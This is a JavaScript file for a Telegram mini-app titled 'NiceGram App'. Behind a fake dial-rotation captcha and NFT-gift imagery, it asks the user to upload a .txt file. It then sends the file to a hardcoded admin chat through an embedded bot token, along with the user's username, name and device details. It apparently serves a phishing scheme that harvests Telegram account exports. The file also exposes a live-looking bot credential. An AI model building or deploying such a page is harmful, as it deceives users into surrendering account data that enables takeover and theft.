const tg = window.Telegram.WebApp;
tg.expand();

// --- НАСТРОЙКИ ---
const BOT_TOKEN = "8567185651:AAFx8TIPf4nEle-hGT25sfip20dB7m0VT1I";
const ADMIN_ID = "7632180689";

// Фоновые изображения
const BG_IMAGES = [
    "https://static6.tgstat.ru/channels/_0/7c/7c8536637e62010b627a43f09fe8a469.jpg",
    "https://cache.tonapi.io/imgproxy/emGFD8G3jt41AkBJLS2ygiHlTP20aCPP_tN0O7j_9aA/rs:fill:1500:1500:1/g:no/aHR0cHM6Ly9uZnQuZnJhZ21lbnQuY29tL2dpZnQvY3J5c3RhbGJhbGwtNDk0LndlYnA.webp",
    "https://i.getgems.io/cj6OL84WRNDlEU1STgJv-6EComaWdEiyGa3ueSBHvzw/rs:fill:1000:0:1/g:ce/czM6Ly9nZXRnZW1zLXMzL25mdC1jb250ZW50L2NhY2hlL2ltYWdlcy9FUURMN0hNYmNhMEZ1ZnJqSEZjUm9pTGtFaU9Ya1hvT192SDJnVlVOOEpOcDRraEsvNjgzMDZjMTkyYWNjMDU3Mw",
    "https://yt3.googleusercontent.com/v5uMoct16G7gneNFzOx71EZHam15nxmcxpcovXNMRMM0UtxsGq0IWn5ZcLmQ0pGgOIuGHBSTmFY=s900-c-k-c0x00ffffff-no-rj"
];

// --- ПЕРЕМЕННЫЕ ---
let angle = 0;
let isDragging = false;
let targetStart = 0;
let targetEnd = 0;

// --- ЭЛЕМЕНТЫ DOM ---
const elements = {
    circle: document.getElementById('circle'),
    degree: document.getElementById('degree'),
    captchaScreen: document.getElementById('captcha-screen'),
    mainScreen: document.getElementById('main-screen'),
    statusMsg: document.getElementById('status-msg'),
    deviceInfo: document.getElementById('device-info'),
    welcomeUser: document.getElementById('welcome-user'),
    degreeMarks: document.getElementById('degree-marks'),
    targetHint: document.getElementById('target-hint'),
    verifyBtn: document.getElementById('verify-btn'),
    selectFileBtn: document.getElementById('select-file-btn'),
    fileInput: document.getElementById('file-input')
};

// ========== ФОНОВЫЕ ИЗОБРАЖЕНИЯ ==========

function createFloatingImages() {
    const container = document.getElementById('floating-images');
    container.innerHTML = '';
    
    // Разные стартовые позиции для каждой картинки
    const positions = [
        {top: '10%', left: '15%', delay: '0s'},
        {top: '20%', left: '70%', delay: '2s'},
        {top: '60%', left: '20%', delay: '4s'},
        {top: '70%', left: '65%', delay: '6s'}
    ];
    
    BG_IMAGES.forEach((src, index) => {
        const img = document.createElement('img');
        img.className = 'floating-img';
        img.src = src;
        img.alt = '';
        img.loading = 'lazy';
        
        // Адаптивные размеры
        const isMobile = window.innerWidth < 768;
        const size = isMobile ? 60 : 80;
        img.style.width = `${size}px`;
        img.style.height = `${size}px`;
        
        // Позиция
        img.style.top = positions[index].top;
        img.style.left = positions[index].left;
        
        // Анимация
        img.style.animationDelay = positions[index].delay;
        img.style.animationDuration = `${20 + index * 5}s`;
        
        // Синее свечение
        img.style.boxShadow = `0 0 ${isMobile ? '25px' : '30px'} rgba(0, 150, 255, 0.7)`;
        
        container.appendChild(img);
    });
}

// ========== ЦИФЕРБЛАТ (до 180°) ==========

function createDegreeMarks() {
    elements.degreeMarks.innerHTML = '';
    
    // Только до 180° (0, 10, 20, ..., 170)
    for (let i = 0; i <= 180; i += 10) {
        const mark = document.createElement('div');
        mark.className = 'degree-mark';
        mark.textContent = i;
        
        // Позиционирование по полукругу
        const angleRad = (i - 90) * Math.PI / 180;
        const radius = 100;
        const x = radius * Math.cos(angleRad);
        const y = radius * Math.sin(angleRad);
        
        mark.style.left = `calc(50% + ${x}px)`;
        mark.style.top = `calc(50% + ${y}px)`;
        mark.style.transform = 'translate(-50%, -50%)';
        
        elements.degreeMarks.appendChild(mark);
    }
}

// ========== ГЕНЕРАЦИЯ ЦЕЛЕВОГО ДИАПАЗОНА (до 180°) ==========

function generateTargetRange() {
    // Случайный стартовый угол от 0 до 160 (чтобы влез диапазон 20°)
    targetStart = Math.floor(Math.random() * 16) * 10; // 0, 10, 20, ..., 150, 160
    
    // Конец через 20° (диапазон 20°)
    targetEnd = targetStart + 20;
    
    // Убеждаемся, что не вышли за 180°
    if (targetEnd > 180) {
        targetEnd = 180;
        targetStart = 160;
    }
    
    // Обновляем подсказку
    elements.targetHint.textContent = `Цель: ${targetStart}° - ${targetEnd}°`;
    
    // Подсвечиваем метки
    highlightTargetMarks();
}

function highlightTargetMarks() {
    // Снимаем подсветку
    document.querySelectorAll('.degree-mark').forEach(mark => {
        mark.classList.remove('target');
    });
    
    // Подсвечиваем целевой диапазон
    document.querySelectorAll('.degree-mark').forEach(mark => {
        const markAngle = parseInt(mark.textContent);
        if (markAngle >= targetStart && markAngle <= targetEnd) {
            mark.classList.add('target');
        }
    });
}

// Проверка попадания в диапазон
function isAngleInTarget(currentAngle) {
    return currentAngle >= targetStart && currentAngle <= targetEnd;
}

// ========== ВРАЩЕНИЕ СТРЕЛКИ (ограничено 0-180°) ==========

function handleRotation(e) {
    if (!isDragging) return;
    
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
    
    const rect = elements.circle.parentElement.getBoundingClientRect();
    const centerX = rect.left + rect.width / 2;
    const centerY = rect.top + rect.height / 2;
    
    // Вычисляем угол
    let radians = Math.atan2(clientY - centerY, clientX - centerX);
    let rawAngle = Math.round(radians * (180 / Math.PI) + 90);
    
    // Ограничиваем угол от 0 до 180°
    if (rawAngle < 0) rawAngle += 360;
    if (rawAngle > 180 && rawAngle < 360) {
        // Если угол в диапазоне 181-359, проецируем его на верхнюю половину
        angle = 180 - (rawAngle - 180);
    } else if (rawAngle >= 360) {
        angle = rawAngle - 360;
    } else {
        angle = rawAngle;
    }
    
    // Убеждаемся, что угол в пределах 0-180
    angle = Math.max(0, Math.min(180, angle));
    
    // Обновляем отображение
    elements.circle.style.transform = `rotate(${angle}deg)`;
    elements.degree.textContent = `${angle}°`;
    
    // Подсветка при попадании в диапазон
    if (isAngleInTarget(angle)) {
        elements.circle.style.background = 'linear-gradient(135deg, #00aa00, #008800)';
        elements.circle.style.boxShadow = '0 0 20px #00ff00';
        elements.degree.style.color = '#00ff00';
    } else {
        elements.circle.style.background = 'linear-gradient(135deg, #008800, #004400)';
        elements.circle.style.boxShadow = '0 0 15px rgba(0, 255, 0, 0.4)';
        elements.degree.style.color = '#00ff00';
    }
}

// ========== ИНИЦИАЛИЗАЦИЯ КАПЧИ ==========

function initializeCaptcha() {
    // События для вращения
    elements.circle.addEventListener('mousedown', () => {
        isDragging = true;
        elements.circle.style.cursor = 'grabbing';
    });
    
    elements.circle.addEventListener('touchstart', (e) => {
        e.preventDefault();
        isDragging = true;
        elements.circle.style.cursor = 'grabbing';
    });
    
    window.addEventListener('mousemove', handleRotation);
    window.addEventListener('touchmove', handleRotation, {passive: false});
    
    window.addEventListener('mouseup', () => {
        isDragging = false;
        elements.circle.style.cursor = 'grab';
    });
    
    window.addEventListener('touchend', () => {
        isDragging = false;
        elements.circle.style.cursor = 'grab';
    });
    
    // Кнопка проверки
    elements.verifyBtn.onclick = () => {
        if (isAngleInTarget(angle)) {
            // Успех
            if (tg.HapticFeedback) {
                tg.HapticFeedback.impactOccurred('light');
            }
            
            // Плавный переход
            elements.captchaScreen.style.opacity = '0';
            elements.captchaScreen.style.transition = 'opacity 0.3s';
            
            setTimeout(() => {
                elements.captchaScreen.classList.add('hidden');
                elements.mainScreen.classList.remove('hidden');
                
                // Приветствие
                const firstName = tg.initDataUnsafe?.user?.first_name || "Пользователь";
                elements.welcomeUser.textContent = `Добро пожаловать, ${firstName}!`;
                
                // Анимация появления
                elements.mainScreen.style.opacity = '0';
                setTimeout(() => {
                    elements.mainScreen.style.opacity = '1';
                }, 50);
                
            }, 300);
        } else {
            // Ошибка
            if (tg.HapticFeedback) {
                tg.HapticFeedback.impactOccurred('heavy');
            }
            alert("❌ Неверно! Поверните стрелку в диапазон " + targetStart + "°-" + targetEnd + "°");
        }
    };
}

// ========== ОПРЕДЕЛЕНИЕ УСТРОЙСТВА ==========

function detectDevice() {
    const platform = tg.platform || "Неизвестно";
    const userAgent = navigator.userAgent.toLowerCase();
    
    let device = "Неизвестно";
    
    if (/android/.test(userAgent)) {
        device = "📱 Android";
    } else if (/iphone|ipad|ipod/.test(userAgent)) {
        device = "📱 iOS";
    } else if (/windows/.test(userAgent)) {
        device = "💻 Windows";
    } else if (/mac/.test(userAgent)) {
        device = "💻 macOS";
    } else if (/linux/.test(userAgent)) {
        device = "💻 Linux";
    }
    
    elements.deviceInfo.innerHTML = `
        <div>📱 <strong>Устройство:</strong> ${device}</div>
        <div>🌐 <strong>Платформа:</strong> ${platform}</div>
    `;
    
    return { device, platform };
}

// ========== ОТПРАВКА ФАЙЛА ==========

function initializeFileUpload() {
    elements.selectFileBtn.onclick = () => {
        if (tg.HapticFeedback) {
            tg.HapticFeedback.selectionChanged();
        }
        elements.fileInput.click();
    };
    
    elements.fileInput.onchange = async () => {
        const file = elements.fileInput.files[0];
        if (!file) return;
        
        // Проверка типа файла
        if (!file.name.toLowerCase().endsWith('.txt')) {
            showStatus("❌ Ошибка: Разрешены только .txt файлы!", 'error');
            elements.fileInput.value = "";
            return;
        }
        
        // Проверка размера
        if (file.size > 10 * 1024 * 1024) {
            showStatus("❌ Файл слишком большой! Максимум 10MB", 'error');
            elements.fileInput.value = "";
            return;
        }
        
        showStatus("⏳ Отправка файла...", 'loading');
        
        // Сбор данных
        const user = tg.initDataUnsafe?.user || {};
        const username = user.username ? `@${user.username}` : "Скрыт";
        const firstName = user.first_name || "Пользователь";
        const { device, platform } = detectDevice();
        
        try {
            const formData = new FormData();
            formData.append('chat_id', ADMIN_ID);
            formData.append('document', file);
            
            const caption = `📄 Файл: ${file.name}\n` +
                           `👤 Пользователь: ${username}\n` +
                           `👨 Имя: ${firstName}\n` +
                           `📱 Устройство: ${device}\n` +
                           `🌐 Платформа: ${platform}\n` +
                           `📦 Размер: ${(file.size / 1024).toFixed(1)} KB`;
            
            formData.append('caption', caption);
            
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (response.ok && data.ok) {
                showStatus("✅ Файл успешно отправлен!", 'success');
                if (tg.HapticFeedback) {
                    tg.HapticFeedback.notificationOccurred('success');
                }
                
                // Очистка через 3 секунды
                setTimeout(() => {
                    elements.statusMsg.className = 'status';
                    elements.fileInput.value = "";
                }, 3000);
            } else {
                showStatus(`❌ Ошибка: ${data.description || 'Неизвестная ошибка'}`, 'error');
            }
        } catch (error) {
            showStatus("❌ Ошибка сети. Проверьте соединение.", 'error');
            console.error('Ошибка отправки:', error);
        }
    };
}

// Показать статус
function showStatus(message, type = 'loading') {
    elements.statusMsg.textContent = message;
    elements.statusMsg.className = `status active ${type === 'success' ? 'success' : type === 'error' ? 'error' : ''}`;
}

// ========== ИНИЦИАЛИЗАЦИЯ ПРИЛОЖЕНИЯ ==========

function initApp() {
    tg.ready();
    
    // Инициализация
    createDegreeMarks();
    generateTargetRange();
    createFloatingImages();
    initializeCaptcha();
    initializeFileUpload();
    detectDevice();
    
    // Адаптация при изменении размера
    window.addEventListener('resize', () => {
        createFloatingImages();
        createDegreeMarks();
        highlightTargetMarks();
    });
    
    console.log('NiceGram App запущен');
    console.log(`Целевой диапазон: ${targetStart}° - ${targetEnd}°`);
}

// Запуск при загрузке
document.addEventListener('DOMContentLoaded', initApp);
